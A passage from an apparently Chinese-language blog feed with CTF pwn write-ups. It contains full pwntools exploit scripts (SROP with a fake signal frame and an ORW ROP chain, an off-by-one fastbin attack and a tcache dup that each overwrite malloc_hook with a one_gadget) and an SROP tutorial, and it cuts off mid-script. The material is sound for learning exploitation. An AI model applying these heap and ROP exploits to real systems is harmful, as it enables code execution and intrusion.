class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><h2 id="simpleHeap"><a href="#simpleHeap" class="headerlink" title="simpleHeap"></a>simpleHeap</h2><p>off-by-one漏洞，利用堆块重叠修改下一个堆块的size，造成overlap，可leak出libc_addr,再利用overlap进行fastbin attack，修改malloc_hook为one_gadget。但是此处所有的one_gadget条件均不满足，因此需要利用realloc函数调整栈帧。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'vn.node3.buuoj.cn'</span>,<span class="number">52145</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(lenght,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(lenght))</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'\x00'</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x58</span>,<span class="string">'\x00'</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'\x00'</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x18</span>+<span class="string">'\xd1'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'A'</span>) <span class="comment"># 1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) <span class="number">-0x3c4c41</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span>  </span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># free fastbin</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">11</span>+p64(one_gadget)+p64(realloc+<span class="number">14</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,str(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h2><p>ubuntu18.04的uaf漏洞，有tcache机制，限制了free的次数为3，申请一个0x88的堆块释放两次，可以先利用Tcache dup泄露Heap address，然后再申请劫持Tcache structure，向任意地址读写，向malloc_hook写one_gadget完成利用，但是此处所有的one_gadget条件均不满足，因此需要利用realloc函数调整栈帧才能利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line">p.sendafter(<span class="string">'content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'4'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">p = process(<span class="string">'vn_pwn_easyTHeap'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 1</span></span><br><span class="line"> </span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'heap_addr'</span>,heap_addr))</span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_addr<span class="number">-0x250</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3ebca0</span></span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'libc_base'</span>,libc_base))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(malloc_hook<span class="number">-0x8</span>))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 5</span></span><br><span class="line">edit(<span class="number">5</span>,p64(one_gadget)+p64(realloc+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x66</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   rcx == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f322 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x40] == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x10a38c execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x70] == NULL</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;V-amp-N招新赛writeup&quot;&gt;&lt;a href=&quot;#V-amp-N招新赛writeup&quot; class=&quot;headerlink&quot; title=&quot;V&amp;amp;N招新赛writeup&quot;&gt;&lt;/a&gt;V&amp;amp;N招新赛writeup&lt;/h1&gt;&lt;p&gt;参考链接:&lt;a hr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>SROP</title>
    <link href="https://nocbtm.github.io/2020/02/28/SROP/"/>
    <id>https://nocbtm.github.io/2020/02/28/SROP/</id>
    <published>2020-02-28T09:27:56.000Z</published>
    <updated>2020-04-11T13:41:49.269Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是SROP"><a href="#什么是SROP" class="headerlink" title="什么是SROP"></a>什么是SROP</h2><p><code>SROP</code> 全称<code>Sigreturn Oriented Programming</code>，<code>sigreturn</code>是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用。</p><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。一般来说，信号机制常见的步骤如下图所示：</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-1.png" class="lozad"></p><p>包含的流程包括：</p><ol><li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li><li>内核会为该进程保存相应的上下文，将当前的信息压入栈中（栈寄存器等），以及将 sigreturn系统调用地址压入栈中。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</li><li>执行 sigreturn 系统调用，恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119，64 位的系统调用号为 15。</li></ol><p>保存在栈中的进程上下文信息为<code>ucontext_t</code>结构体，称其为<code>Signal Frame</code>，其结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// defined in /usr/include/sys/ucontext.h</span></span><br><span class="line"><span class="comment">/* Userlevel context.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> uc_flags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span> *<span class="title">uc_link</span>;</span></span><br><span class="line">    <span class="keyword">stack_t</span> uc_stack;           <span class="comment">// the stack used by this context</span></span><br><span class="line">    <span class="keyword">mcontext_t</span> uc_mcontext;     <span class="comment">// the saved context</span></span><br><span class="line">    <span class="keyword">sigset_t</span> uc_sigmask;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpstate</span> __<span class="title">fpregs_mem</span>;</span></span><br><span class="line">  &#125; <span class="keyword">ucontext_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// defined in /usr/include/bits/types/stack_t.h</span></span><br><span class="line"><span class="comment">/* Structure describing a signal stack.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ss_sp;</span><br><span class="line">    <span class="keyword">size_t</span> ss_size;</span><br><span class="line">    <span class="keyword">int</span> ss_flags;</span><br><span class="line">  &#125; <span class="keyword">stack_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// difined in /usr/include/bits/sigcontext.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> __pad0;</span><br><span class="line">  <span class="keyword">__uint64_t</span> err;</span><br><span class="line">  <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">  <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由于<code>Signal Frame</code>是在用户态的栈中，因此若在栈中伪造<code>Signal Frame</code>，同时调<code>sigreturn</code>系统调用，即可实现对所有寄存器的控制包括rip，从而实现攻击。</p><p>如若只想调用执行一个函数，如get shell，则可直接将rip指向system，将rdi指向binsh地址即可，如下图所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-2.png" class="lozad"></p><p>如果想执行一系列函数，我们可以通过rsp指针来实现相应的rop链，包括两个步骤：</p><ul><li>控制栈指针。</li><li>把原来 rip 指向的syscall gadget 换成syscall; ret gadget。</li></ul><p>示意图如下所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-3.png" class="lozad"></p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>以V&amp;N招新赛babypwn为例</p><p>思路如下：</p><p>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span 